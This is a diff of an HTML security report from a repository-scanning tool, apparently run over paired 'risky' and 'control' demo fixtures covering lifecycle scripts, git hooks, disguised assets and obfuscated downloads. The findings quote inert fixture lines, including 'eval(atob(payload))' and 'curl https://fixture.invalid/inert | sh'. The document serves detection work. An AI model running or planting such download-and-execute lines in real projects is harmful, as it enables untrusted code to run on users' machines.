@@ -1,7 +1,11 @@
 <!doctype html>
-<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'sha256-6vkP&#43;SPOE1tsi8Bo3xCiairLQk0tVyy7sZQhaPciSzM='; script-src 'sha256-Z0fw6PdH591Jr9RHeMlxvyaw&#43;rg7wsOc0SwPEG&#43;0/jc='; img-src data:; base-uri 'none'; form-action 'none'; connect-src 'none'; object-src 'none'">
-<title>repyy security review</title><style>:root {
+<title>repyy security review</title>
+<style>:root {
   color-scheme: light;
   font: 100%/1.5 system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", sans-serif;
   font-optical-sizing: auto;
@@ -133,71 +137,1306 @@ pre { margin: .4rem 0 0; padding: .7rem .8rem; overflow-wrap: anywhere; border-r
   .masthead, .finding, .coverage, .file-row { break-inside: avoid }
   details > summary { display: none }
   details > * { display: block !important }
-}</style></head><body><a class="skip-link" href="#report-content">Skip to report</a><main id="report-content">
-<header class="masthead" aria-labelledby="report-title"><div class="report-brand" aria-label="repyy report">repyy<span aria-hidden="true">/</span><small>Report</small></div><p class="eyebrow">Read-only repository preflight</p><h1 id="report-title">repyy security review</h1><div class="meta" aria-label="Report metadata"><span class="pill">repyy 0.5.0-dev</span><span class="pill">commit unknown</span><span class="pill">rules 2026.09.9</span><span class="pill">intelligence 2026-09-12.1</span><span class="pill">generated <time datetime="2026-09-14T16:45:12Z">2026-09-14T16:45:12Z</time></span></div><p class="muted spaced">Report <code>sha256:2f7f9b6a27401d5c9e34ab787032b5f29aa56bb32cba117c7cdb95b48cca4c51</code></p></header>
+}</style>
+</head>
+<body>
+<a class="skip-link" href="#report-content">Skip to report</a>
+<main id="report-content">
+<header class="masthead" aria-labelledby="report-title">
+<div class="report-brand" aria-label="repyy report">repyy<span aria-hidden="true">/</span>
+<small>Report</small>
+</div>
+<p class="eyebrow">Read-only repository preflight</p>
+<h1 id="report-title">repyy security review</h1>
+<div class="meta" aria-label="Report metadata">
+<span class="pill">repyy 0.5.1-dev</span>
+<span class="pill">commit unknown</span>
+<span class="pill">rules 2026.09.15</span>
+<span class="pill">intelligence 2026-09-12.1</span>
+<span class="pill">generated <time datetime="2026-09-14T17:06:34Z">2026-09-14T17:06:34Z</time>
+</span>
+</div>
+<p class="muted spaced">Report <code>sha256:c6748bfcebf80278bef99e23c66cbbbc6e0125259bc8530bf8ff0f5e24c63050</code>
+</p>
+</header>
 <section class="review-controls" aria-label="Review controls">
-<div class="view-switch" role="group" aria-label="Report view"><button data-view="findings" aria-pressed="true" type="button">Findings</button><button data-view="files" aria-pressed="false" type="button">Files</button><span class="pill"><output data-visible-count aria-live="polite">0</output> results</span></div>
+<div class="view-switch" role="group" aria-label="Report view">
+<button data-view="findings" aria-pressed="true" type="button">Findings</button>
+<button data-view="files" aria-pressed="false" type="button">Files</button>
+<span class="pill">
+<output data-visible-count aria-live="polite">0</output> results</span>
+</div>
 <section class="filters" aria-label="Finding filters">
 <input data-filter="search" type="search" placeholder="Search findings" aria-label="Search findings">
-<select data-filter="severity" aria-label="Severity"><option value="">All severities</option><option>critical</option><option>high</option><option>medium</option><option>low</option></select>
-<select data-filter="disposition" aria-label="Disposition"><option value="actionable" selected>Review queue</option><option value="">All dispositions</option><option>block</option><option>review</option><option>harden</option><option>informational</option></select>
-<details class="more-filters"><summary>More filters</summary><div class="more-filters-grid">
-<select data-filter="confidence" aria-label="Confidence"><option value="">All confidence</option><option>high</option><option>medium</option><option>low</option></select>
-<select data-filter="category" aria-label="Category"><option value="">All categories</option><option>container-risk</option><option>credential-harvesting</option><option>download-execute</option><option>dynamic-execution</option><option>environment-access</option><option>executable-file</option><option>git-hook</option><option>package-lifecycle</option><option>remote-fetch</option><option>string-obfuscation</option></select>
-<select data-filter="rule" aria-label="Rule"><option value="">All rules</option><option>CHAIN-001</option><option>CRED-001</option><option>DOCKER-001</option><option>ENV-001</option><option>EXEC-001</option><option>EXECBIT-001</option><option>GITHOOK-001</option><option>NET-001</option><option>OBFS-002</option><option>PKG-001</option></select>
-<select data-filter="file" aria-label="File"><option value="">All files</option><option>.git/hooks/pre-commit</option><option>banner.png</option><option>compose.yaml</option><option>marker.js</option><option>package.json</option></select>
-</div><button class="reset" data-reset type="button">Reset filters</button></details></section></section>
+<select data-filter="severity" aria-label="Severity">
+<option value="">All severities</option><option>critical</option><option>high</option><option>medium</option><option>low</option></select>
+<select data-filter="disposition" aria-label="Disposition">
+<option value="actionable" selected>Review queue</option>
+<option value="">All dispositions</option><option>block</option><option>review</option><option>harden</option><option>informational</option></select>
+<details class="more-filters">
+<summary>More filters</summary>
+<div class="more-filters-grid">
+<select data-filter="confidence" aria-label="Confidence">
+<option value="">All confidence</option><option>high</option><option>medium</option><option>low</option></select>
+<select data-filter="category" aria-label="Category">
+<option value="">All categories</option><option>container-risk</option><option>credential-harvesting</option><option>download-execute</option><option>dynamic-execution</option><option>dynamic-import</option><option>editor-auto-execution</option><option>environment-access</option><option>executable-file</option><option>git-hook</option><option>package-lifecycle</option><option>remote-fetch</option><option>string-obfuscation</option></select>
+<select data-filter="rule" aria-label="Rule">
+<option value="">All rules</option><option>CHAIN-001</option><option>CRED-001</option><option>DOCKER-001</option><option>ENV-001</option><option>EXEC-001</option><option>EXECBIT-001</option><option>GITHOOK-001</option><option>IDE-001</option><option>IMPORT-001</option><option>NET-001</option><option>OBFS-002</option><option>PKG-001</option></select>
+<select data-filter="file" aria-label="File">
+<option value="">All files</option><option>.git/hooks/pre-commit</option><option>.vscode/tasks.json</option><option>banner.png</option><option>compose.yaml</option><option>marker.js</option><option>package.json</option><option>postcss.config.cjs</option></select>
+</div>
+<button class="reset" data-reset type="button">Reset filters</button>
+</details>
+</section>
+</section>
 <p class="empty-state" data-empty role="status" aria-live="polite" hidden>No findings match the current filters.</p>
-<article class="repo" aria-label="Repository review for demo/lifecycle/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/lifecycle/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">1</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: PKG-001 at package.json:1.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>1</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>1 total findings</span><span>0 high total</span><span>1 medium</span><span>0 low</span><span>0 block</span><span>1 review</span><span>0 harden</span><span>0 informational</span><span>129 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/lifecycle/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="pkg-001 package-lifecycle package.json package lifecycle script: postinstall echo repyy_inert_lifecycle review package.json echo repyy_inert_lifecycle" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="package-lifecycle" data-rule="PKG-001" data-file="package.json"><header class="finding-head"><div><h3>PKG-001 · Package lifecycle script: postinstall</h3><p class="tags"><span>medium</span><span>medium confidence</span><span>review</span><span>manifest-hook</span><span>package-lifecycle</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>package.json:1</strong><pre aria-label="Redacted evidence"><code>echo REPYY_INERT_LIFECYCLE</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies package lifecycle behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> package.json and supported dependency manifests</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Review this script before installing dependencies.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/lifecycle/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="package.json"><span>package.json</span><span>1 findings · highest medium</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 129 B</p></section></article><article class="repo" aria-label="Repository review for demo/lifecycle/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/lifecycle/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>114 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/lifecycle/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/lifecycle/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 114 B</p></section></article><article class="repo" aria-label="Repository review for demo/startup/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/startup/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>4</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>142 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/startup/risky"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/startup/risky"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 4 files · 142 B</p></section></article><article class="repo" aria-label="Repository review for demo/startup/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/startup/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>88 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/startup/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/startup/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 88 B</p></section></article><article class="repo" aria-label="Repository review for demo/disguised-asset/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/disguised-asset/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">2</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: EXEC-001 at banner.png:1.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>2</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>1</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>2 total findings</span><span>1 high total</span><span>1 medium</span><span>0 low</span><span>0 block</span><span>2 review</span><span>0 harden</span><span>0 informational</span><span>92 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/disguised-asset/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="exec-001 dynamic-execution banner.png dynamic code execution primitive const marker = &#39;eval(atob(payload))&#39;; review banner.png const marker = &#39;eval(atob(payload))&#39;;" data-severity="high" data-confidence="medium" data-disposition="review" data-category="dynamic-execution" data-rule="EXEC-001" data-file="banner.png"><header class="finding-head"><div><h3>EXEC-001 · Dynamic code execution primitive</h3><p class="tags"><span>high</span><span>medium confidence</span><span>review</span><span>executable</span><span>dynamic-execution</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>banner.png:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;eval(atob(payload))&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies dynamic execution behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>Frameworks and developer tools sometimes evaluate generated or sandboxed code.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article><article class="finding" data-finding data-search="obfs-002 string-obfuscation banner.png string decoding or character-code construction const marker = &#39;eval(atob(payload))&#39;; review banner.png const marker = &#39;eval(atob(payload))&#39;;" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="string-obfuscation" data-rule="OBFS-002" data-file="banner.png"><header class="finding-head"><div><h3>OBFS-002 · String decoding or character-code construction</h3><p class="tags"><span>medium</span><span>medium confidence</span><span>review</span><span>executable</span><span>string-obfuscation</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>banner.png:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;eval(atob(payload))&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies string obfuscation behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/disguised-asset/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="banner.png"><span>banner.png</span><span>2 findings · highest high</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 92 B</p></section></article><article class="repo" aria-label="Repository review for demo/disguised-asset/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/disguised-asset/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>154 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/disguised-asset/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/disguised-asset/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 154 B</p></section></article><article class="repo" aria-label="Repository review for demo/folder-open/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/folder-open/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>216 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/folder-open/risky"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/folder-open/risky"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 216 B</p></section></article><article class="repo" aria-label="Repository review for demo/folder-open/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/folder-open/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>177 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/folder-open/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/folder-open/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 177 B</p></section></article><article class="repo" aria-label="Repository review for demo/git-hook/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/git-hook/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">2</output> visible findings</p></div><strong class="verdict review-required" role="status">REVIEW REQUIRED</strong></header><p class="reason">Highest-priority finding: GITHOOK-001 at .git/hooks/pre-commit:2.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>1</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>1</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>2 total findings</span><span>1 high total</span><span>0 medium</span><span>1 low</span><span>0 block</span><span>1 review</span><span>0 harden</span><span>1 informational</span><span>122 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/git-hook/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="githook-001 git-hook .git/hooks/pre-commit executable git hook or hooks-path override # inert pre-commit fixture review .git/hooks/pre-commit # inert pre-commit fixture" data-severity="high" data-confidence="medium" data-disposition="review" data-category="git-hook" data-rule="GITHOOK-001" data-file=".git/hooks/pre-commit"><header class="finding-head"><div><h3>GITHOOK-001 · Executable Git hook or hooks-path override</h3><p class="tags"><span>high</span><span>medium confidence</span><span>review</span><span>git-hook</span><span>git-hook</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>.git/hooks/pre-commit:2</strong><pre aria-label="Redacted evidence"><code># Inert pre-commit fixture</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies git hook behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> config, *.hook, pre-commit, post-checkout, post-merge, post-rewrite</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article><article class="finding" data-finding data-search="execbit-001 executable-file .git/hooks/pre-commit file has executable permissions executable permission bit informational .git/hooks/pre-commit executable permission bit" data-severity="low" data-confidence="medium" data-disposition="informational" data-category="executable-file" data-rule="EXECBIT-001" data-file=".git/hooks/pre-commit"><header class="finding-head"><div><h3>EXECBIT-001 · File has executable permissions</h3><p class="tags"><span>low</span><span>medium confidence</span><span>informational</span><span>executable</span><span>executable-file</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>.git/hooks/pre-commit</strong><pre aria-label="Redacted evidence"><code>executable permission bit</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies executable file behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Review whether this file needs to be executable.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/git-hook/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file=".git/hooks/pre-commit"><span>.git/hooks/pre-commit</span><span>2 findings · highest high</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 122 B</p></section></article><article class="repo" aria-label="Repository review for demo/git-hook/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/git-hook/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>2</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>54 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/git-hook/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/git-hook/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 2 files · 54 B</p></section></article><article class="repo" aria-label="Repository review for demo/obfuscated-download/risky"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/obfuscated-download/risky</h2><p class="muted"><output data-repo-visible-count aria-live="polite">3</output> visible findings</p></div><strong class="verdict do-not-run" role="status">FINDINGS DETECTED</strong></header><p class="reason">Highest-priority finding: CHAIN-001 at marker.js:1.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>2</dd></div><div><dt>Critical priority</dt><dd>1</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>3 total findings</span><span>0 high total</span><span>2 medium</span><span>0 low</span><span>1 block</span><span>1 review</span><span>0 harden</span><span>1 informational</span><span>133 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/obfuscated-download/risky"><h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="chain-001 download-execute marker.js remote download piped into a command interpreter const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; block marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="critical" data-confidence="high" data-disposition="block" data-category="download-execute" data-rule="CHAIN-001" data-file="marker.js"><header class="finding-head"><div><h3>CHAIN-001 · Remote download piped into a command interpreter</h3><p class="tags"><span>critical</span><span>high confidence</span><span>block</span><span>executable</span><span>download-execute</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies download execute behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Do not run the repository. Verify the source and intent in an isolated environment.</p></div></div></details></article><article class="finding" data-finding data-search="obfs-002 string-obfuscation marker.js string decoding or character-code construction const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; review marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="string-obfuscation" data-rule="OBFS-002" data-file="marker.js"><header class="finding-head"><div><h3>OBFS-002 · String decoding or character-code construction</h3><p class="tags"><span>medium</span><span>medium confidence</span><span>review</span><span>executable</span><span>string-obfuscation</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies string obfuscation behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article><article class="finding" data-finding data-search="net-001 remote-fetch marker.js remote content fetch const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; informational marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="medium" data-confidence="low" data-disposition="informational" data-category="remote-fetch" data-rule="NET-001" data-file="marker.js"><header class="finding-head"><div><h3>NET-001 · Remote content fetch</h3><p class="tags"><span>medium</span><span>low confidence</span><span>informational</span><span>executable</span><span>remote-fetch</span></p></div><span aria-label="1 occurrence">1 occurrence</span></header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence"><code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code></pre></div><details><summary>Why this was flagged and what to do</summary><div class="guidance"><div><strong>Why it matters</strong><p>This rule identifies remote fetch behavior that can affect repository trust or execution safety.</p><p><strong>Applies to:</strong> **</p></div><div><strong>Common legitimate use</strong><p>Installers and update tools may retrieve content from reviewed, pinned sources.</p></div><div><strong>Recommended action</strong><p>Inspect the surrounding code and remove the behavior if it is not essential.</p></div></div></details></article></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/obfuscated-download/risky"><h2 class="section-heading">Files</h2><ul class="file-list"><li class="file-row" data-file-row data-file="marker.js"><span>marker.js</span><span>3 findings · highest critical</span></li></ul></section>
-<section class="coverage" aria-label="Scan coverage"><h3>Coverage</h3><p>Complete · 3 files · 133 B</p></section></article><article class="repo" aria-label="Repository review for demo/obfuscated-download/control"><header class="repo-heading"><div><p class="eyebrow">Repository</p><h2>demo/obfuscated-download/control</h2><p class="muted"><output data-repo-visible-count aria-live="polite">0</output> visible findings</p></div><strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong></header><p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p><dl class="summary-grid" aria-label="Review summary"><div><dt>Needs attention</dt><dd>0</dd></div><div><dt>Critical priority</dt><dd>0</dd></div><div><dt>High priority</dt><dd>0</dd></div><div><dt>Files scanned</dt><dd>3</dd></div></dl><p class="scan-meta"><span>0 total findings</span><span>0 high total</span><span>0 medium</span><span>0 low</span><span>0 block</span><span>0 review</span><span>0 harden</span><span>0 informational</span><span>94 B</span><span>0s</span></p>
-<section data-view-panel="findings" aria-label="Findings for demo/obfuscated-download/control"><h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
-<section data-view-panel="files" aria-label="Files with findings for demo/obfuscated-download/control"><h2 class="section-heading">Files</h2><ul class="file-list"></ul></section>
